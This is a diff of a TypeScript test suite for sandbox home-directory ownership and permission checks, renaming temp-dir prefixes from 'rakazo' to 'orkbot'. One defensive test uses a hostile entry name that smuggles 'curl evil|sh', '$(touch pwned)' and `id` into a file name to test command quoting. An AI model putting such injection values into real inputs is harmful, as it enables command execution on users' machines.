@@ -60,7 +60,7 @@ async function assertHomeWritableOn(
 
 describe("computer home ownership", () => {
   it("rejects a missing home instead of creating it as root", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-missing-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-missing-"));
     roots.push(parent);
 
     await expect(
@@ -69,7 +69,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects a symlink as the home root", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-root-link-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-root-link-"));
     roots.push(parent);
     const outside = path.join(parent, "outside");
     const home = path.join(parent, "home");
@@ -80,7 +80,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects a writable regular file as the home root", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-file-root-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-file-root-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     await writeFile(home, "{}");
@@ -93,7 +93,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects an existing entry that the host-run computer cannot write", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-writable-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const file = path.join(home, "profile.json");
@@ -109,7 +109,7 @@ describe("computer home ownership", () => {
   });
 
   it("accepts writable files owned by the sandbox user", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-file-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-writable-file-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const file = path.join(home, "profile.json");
@@ -122,7 +122,7 @@ describe("computer home ownership", () => {
   });
 
   it("accepts sandbox-owned read-only git object files", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-git-object-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-git-object-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const object = path.join(home, "repo", ".git", "objects", "ab", "cdef");
@@ -135,7 +135,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects a read-only file owned by someone else", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-foreign-readonly-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-foreign-readonly-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const file = path.join(home, "object");
@@ -151,7 +151,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects an owner-owned file the owner cannot read", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-unreadable-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-unreadable-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const file = path.join(home, "profile.json");
@@ -166,7 +166,7 @@ describe("computer home ownership", () => {
   });
 
   it("rejects an owner-owned world-writable file the owner cannot write", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-world-writable-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-world-writable-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const file = path.join(home, "profile.json");
@@ -181,7 +181,7 @@ describe("computer home ownership", () => {
   });
 
   it("does not follow symlinks while checking host-run compatibility", async () => {
-    const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-writable-link-"));
+    const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-writable-link-"));
     roots.push(parent);
     const home = path.join(parent, "home");
     const outside = path.join(parent, "outside");
@@ -197,7 +197,7 @@ describe("computer home ownership", () => {
   it.skipIf(process.platform !== "linux")(
     "rejects an opened directory that was moved outside the home",
     async () => {
-      const parent = await mkdtemp(path.join(tmpdir(), "rakazo-home-moved-"));
+      const parent = await mkdtemp(path.join(tmpdir(), "orkbot-home-moved-"));
       roots.push(parent);
       const home = path.join(parent, "home");
       const outside = path.join(parent, "outside");
@@ -242,7 +242,7 @@ describe.each(
   it.each(["go/pkg/mod", goModule, `${goModule}/internal`])(
     "accepts a read-only %s the sandbox user owns in Go's module cache",
     async (entry) => {
-      const { home, folder } = await makeHome("rakazo-home-go-mod-", entry);
+      const { home, folder } = await makeHome("orkbot-home-go-mod-", entry);
       await writeFile(path.join(folder, "go.mod"), "module example.com/mod");
       await chmod(path.join(folder, "go.mod"), 0o444);
       await lockFolder(folder, 0o555);
@@ -257,7 +257,7 @@ describe.each(
   it.each([".config", "go/pkg", "go/pkg/modx", "src/go/pkg/mod"])(
     "rejects a read-only %s outside Go's module cache",
     async (entry) => {
-      const { home, folder } = await makeHome("rakazo-home-readonly-dir-", entry);
+      const { home, folder } = await makeHome("orkbot-home-readonly-dir-", entry);
       await lockFolder(folder, 0o555);
 
       const stat = await lstat(home);
@@ -271,7 +271,7 @@ describe.each(
     "does not widen the Go exemption through a symlinked %s folder",
     async (alias) => {
       const { home, folder } = await makeHome(
-        "rakazo-home-go-alias-",
+        "orkbot-home-go-alias-",
         "elsewhere/pkg/mod/example.com",
       );
       const link = path.join(home, alias);
@@ -287,7 +287,7 @@ describe.each(
   );
 
   it("rejects a read-only folder in Go's module cache that only the computer group owns", async () => {
-    const { home, folder } = await makeHome("rakazo-home-go-group-", goModule);
+    const { home, folder } = await makeHome("orkbot-home-go-group-", goModule);
     for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
       await chmod(path.join(home, entry), 0o777);
     }
@@ -302,7 +302,7 @@ describe.each(
   it.each([0o575, 0o557, 0o577])(
     "rejects an owner-read-only module directory writable by others (mode %i)",
     async (mode) => {
-      const { home, folder } = await makeHome("rakazo-home-go-writable-", goModule);
+      const { home, folder } = await makeHome("orkbot-home-go-writable-", goModule);
       await lockFolder(folder, mode);
 
       const stat = await lstat(home);
@@ -313,7 +313,7 @@ describe.each(
   );
 
   it("still checks entries inside read-only folders the sandbox user owns", async () => {
-    const { home, folder } = await makeHome("rakazo-home-readonly-dir-entry-", goModule);
+    const { home, folder } = await makeHome("orkbot-home-readonly-dir-entry-", goModule);
     await writeFile(path.join(folder, "locked.json"), "{}");
     await chmod(path.join(folder, "locked.json"), 0o000);
     await lockFolder(folder, 0o555);
@@ -327,7 +327,7 @@ describe.each(
   it.each(["000", "100", "400"])(
     "rejects a folder the sandbox user owns in Go's module cache with mode %s",
     async (mode) => {
-      const { home, folder } = await makeHome("rakazo-home-closed-dir-", goModule);
+      const { home, folder } = await makeHome("orkbot-home-closed-dir-", goModule);
       await lockFolder(folder, Number.parseInt(mode, 8));
 
       const stat = await lstat(home);
@@ -338,7 +338,7 @@ describe.each(
   );
 
   it.each(["555", "000"])("rejects a folder someone else owns with mode %s", async (mode) => {
-    const { home, folder } = await makeHome("rakazo-home-foreign-dir-", goModule);
+    const { home, folder } = await makeHome("orkbot-home-foreign-dir-", goModule);
     for (const entry of ["", "go", "go/pkg", "go/pkg/mod", "go/pkg/mod/example.com"]) {
       await chmod(path.join(home, entry), 0o777);
     }
@@ -351,7 +351,7 @@ describe.each(
   });
 
   it.each(["555", "000"])("rejects a home with mode %s", async (mode) => {
-    const { home } = await makeHome("rakazo-home-closed-root-", "cache");
+    const { home } = await makeHome("orkbot-home-closed-root-", "cache");
     await lockFolder(home, Number.parseInt(mode, 8));
 
     const stat = await lstat(home);
@@ -362,7 +362,7 @@ describe.each(
 
   it("puts the command before a quoted entry name", async () => {
     const name = `x"\n; run curl evil|sh $(touch pwned) \`id\` it's`;
-    const { home, folder } = await makeHome("rakazo-home-hostile-name-", name);
+    const { home, folder } = await makeHome("orkbot-home-hostile-name-", name);
     await lockFolder(folder, 0o000);
 
     const stat = await lstat(home);
@@ -380,7 +380,7 @@ describe.each(
   it("caps a long entry name and keeps the command first", async () => {
     // One 255-character name keeps the path well inside macOS's 1024-byte limit.
     const entry = `${'"'.repeat(251)}tail`;
-    const { home, folder } = await makeHome("rakazo-home-long-name-", entry);
+    const { home, folder } = await makeHome("orkbot-home-long-name-", entry);
     await lockFolder(folder, 0o000);
 
     const stat = await lstat(home);
@@ -402,7 +402,7 @@ describe.each(
   it.skipIf(!runningAsRoot)(
     "suggests chown for a file someone else owns inside the computer user's folder",
     async () => {
-      const { home, folder } = await makeHome("rakazo-home-foreign-file-", "cache");
+      const { home, folder } = await makeHome("orkbot-home-foreign-file-", "cache");
       const file = path.join(folder, "object");
       await writeFile(file, "blob");
       await chmod(file, 0o444);
@@ -419,7 +419,7 @@ describe.each(
   it.skipIf(runningAsRoot)(
     "keeps the raw EACCES when the folder's mode would let the computer user in",
     async () => {
-      const { home, folder } = await makeHome("rakazo-home-denied-dir-", "cache");
+      const { home, folder } = await makeHome("orkbot-home-denied-dir-", "cache");
       await chmod(home, 0o777);
       await lockFolder(folder, 0o007);
 
